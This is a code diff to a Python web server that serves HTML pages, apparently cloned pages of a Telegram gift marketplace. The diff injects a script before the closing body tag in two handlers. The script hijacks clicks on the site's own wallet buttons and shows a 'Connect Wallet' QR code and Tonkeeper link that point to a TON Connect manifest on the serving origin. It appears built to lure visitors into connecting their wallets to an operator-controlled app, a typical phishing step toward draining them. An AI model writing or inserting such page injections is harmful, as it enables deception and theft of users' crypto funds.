@@ -6,6 +6,71 @@ import urllib.parse
 
 VERSION = 598
 
+TON_CONNECT_SCRIPT = """
+<style>
+#_tc_overlay{display:none;position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.6);align-items:flex-end;justify-content:center}
+#_tc_overlay.open{display:flex}
+@media(min-width:441px){#_tc_overlay{align-items:center}}
+#_tc_box{background:#1a2026;border-radius:16px 16px 0 0;padding:24px;width:100%;max-width:440px;text-align:center;position:relative}
+@media(min-width:441px){#_tc_box{border-radius:16px}}
+#_tc_close{position:absolute;top:16px;right:16px;background:none;border:none;color:#8794a1;font-size:20px;cursor:pointer;line-height:1;padding:4px 8px}
+#_tc_title{color:#fff;font-size:20px;font-weight:700;margin:0 0 8px}
+#_tc_desc{color:#8794a1;font-size:14px;margin:0 0 20px}
+#_tc_qr{width:200px;height:200px;background:#fff;border-radius:12px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+#_tc_qr img{width:100%;height:100%;border-radius:12px}
+#_tc_tk{display:block;width:100%;padding:14px;background:#248bda;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;box-sizing:border-box}
+#_tc_hint{color:#8794a1;font-size:12px;margin:12px 0 0}
+</style>
+<div id="_tc_overlay">
+  <div id="_tc_box">
+    <button id="_tc_close">&#x2715;</button>
+    <h2 id="_tc_title">Connect Wallet</h2>
+    <p id="_tc_desc">Scan the QR code with your TON wallet app</p>
+    <div id="_tc_qr"><img id="_tc_qr_img" src="" alt="QR"/></div>
+    <a id="_tc_tk" href="#" target="_blank">Open Tonkeeper</a>
+    <p id="_tc_hint">Or open any TON wallet and scan the QR code above</p>
+  </div>
+</div>
+<script>
+(function(){
+  function makeid(){return Math.random().toString(36).slice(2)+Math.random().toString(36).slice(2)}
+  function buildLinks(){
+    var origin=location.origin;
+    var sid=makeid();
+    var r=encodeURIComponent(JSON.stringify({manifestUrl:origin+'/tonconnect-manifest.json'}));
+    return{
+      tc:'tc://v1/?id='+sid+'&r='+r+'&ret=back',
+      tk:'https://app.tonkeeper.com/ton-connect?v=2&id='+sid+'&r='+r+'&ret=back'
+    };
+  }
+  function openModal(){
+    var links=buildLinks();
+    var qrUrl='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(links.tc);
+    document.getElementById('_tc_qr_img').src=qrUrl;
+    document.getElementById('_tc_tk').href=links.tk;
+    document.getElementById('_tc_overlay').classList.add('open');
+    document.body.style.overflow='hidden';
+  }
+  function closeModal(){
+    document.getElementById('_tc_overlay').classList.remove('open');
+    document.body.style.overflow='';
+  }
+  document.getElementById('_tc_close').addEventListener('click',closeModal);
+  document.getElementById('_tc_overlay').addEventListener('click',function(e){if(e.target===this)closeModal();});
+  document.addEventListener('click',function(e){
+    var el=e.target;
+    while(el&&el!==document){
+      if(el.classList&&(el.classList.contains('ton-auth-link')||el.classList.contains('js-btn-tonkeeper'))){
+        e.stopPropagation();e.preventDefault();
+        openModal();return;
+      }
+      el=el.parentNode;
+    }
+  },true);
+})();
+</script>
+"""
+
 # Collection slug → singular display name (strip trailing 's' for singular form)
 GIFT_COLLECTIONS = {
     "artisanbrick": "Artisan Brick",
@@ -362,6 +427,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
             content = content.replace("<head>", '<head>\n  <base href="/">', 1)
             if '<base href="/">' not in content:
                 content = re.sub(r'(<head[^>]*>)', r'\1\n  <base href="/">', content, count=1)
+        if "</body>" in content:
+            content = content.replace("</body>", TON_CONNECT_SCRIPT + "</body>", 1)
         data = content.encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
@@ -413,6 +480,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
             content = content.replace("<head>", '<head>\n  <base href="/">', 1)
             if '<base href="/">' not in content:
                 content = re.sub(r'(<head[^>]*>)', r'\1\n  <base href="/">', content, count=1)
+        if "</body>" in content:
+            content = content.replace("</body>", TON_CONNECT_SCRIPT + "</body>", 1)
         data = content.encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
